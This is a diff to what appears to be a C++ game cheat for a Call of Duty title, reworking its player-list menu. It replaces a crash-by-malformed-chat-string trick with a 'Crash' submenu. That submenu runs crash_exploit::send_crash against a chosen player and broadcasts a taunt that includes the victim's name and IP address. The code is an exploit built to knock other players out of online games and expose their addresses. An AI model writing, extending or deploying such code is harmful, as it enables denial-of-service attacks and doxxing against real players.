@@ -29,7 +29,7 @@ namespace NeoGenesys
 
 		for (int i = 0; i < FindVariable("sv_maxclients")->Current.iValue; i++)
 		{
-			if (CharacterInfo[i].iInfoValid)
+			if (IsUserRegistered(GetCurrentSession(), i) || CharacterInformation[i].iInfoValid)
 			{
 				GetPlayerAddr(&PlayerList.NetAddr[i], GetCurrentSession(), i);
 
@@ -54,14 +54,37 @@ namespace NeoGenesys
 
 				if (ImGui::BeginPopupContextItem(std::to_string(i).c_str()))
 				{
-					if (IsSessionHost(GetCurrentSession(), CG->PredictedPlayerState.iClientNum))
+					if (ImGui::BeginMenu("Crash", crash_exploit::send_connectivity_test(i)))
 					{
-						if (ImGui::MenuItem("Crash"))
-						{
-							Say(&GEntity[CG->PredictedPlayerState.iClientNum], &GEntity[i], 0, "\x5E\x01\x3D\x3D\xFF");
+						ImGui::PushItemWidth(100.0f);
+						ImGui::InputText("", PlayerList.szCrashMessage, 1024);
+						ImGui::PopItemWidth();
 
+						ImGui::SameLine();
+						if (ImGui::Button("Execute"))
+						{
+							std::string szCrashMessage(PlayerList.szCrashMessage);
+
+							if (!szCrashMessage.empty())
+							{
+								sNetAddr NetAddr;
+								GetPlayerAddr(&NetAddr, GetCurrentSession(), i);
+
+								szCrashMessage = acut::FindAndReplaceString(szCrashMessage, "%attacker", PlayerName[t6::Party_FindMemberByXUID((SessionData*)NeoGenesys::GetCurrentSession(), t6::Live_GetXuid((ControllerIndex_t)0))].szName);
+								szCrashMessage = acut::FindAndReplaceString(szCrashMessage, "%victim", PlayerName[i].szName);
+								szCrashMessage = acut::FindAndReplaceString(szCrashMessage, "%ip", VariadicText("%u.%u.%u.%u",
+									(BYTE)NetAddr.szIPAddress[0],
+									(BYTE)NetAddr.szIPAddress[1],
+									(BYTE)NetAddr.szIPAddress[2],
+									(BYTE)NetAddr.szIPAddress[3]));
+
+								Cbuf_AddText(VariadicText("say \"%s\"\n", szCrashMessage.c_str()));
+							}
+
+							std::thread(crash_exploit::send_crash, i).detach();
 							PlayerList.bWriteLog = true;
 						}
+						ImGui::EndMenu();
 					}
 
 					if (ImGui::MenuItem("Ignore", (const char*)0, &_targetList.Priorities[i].bIsIgnored))
@@ -83,7 +106,7 @@ namespace NeoGenesys
 					if (ImGui::MenuItem("Copy Name"))
 					{
 						ImGui::LogToClipboard();
-						ImGui::LogText(ClientInfo[i].szName);
+						ImGui::LogText(PlayerName[i].szName);
 						ImGui::LogFinish();
 
 						PlayerList.bWriteLog = true;
@@ -106,7 +129,7 @@ namespace NeoGenesys
 					ImGui::EndPopup();
 				} ImGui::NextColumn();
 
-				ImGui::Text(ClientInfo[i].szName);
+				ImGui::Text(PlayerName[i].szName);
 
 				if (ImGui::OpenPopupOnItemClick(std::to_string(i).c_str()))
 				{
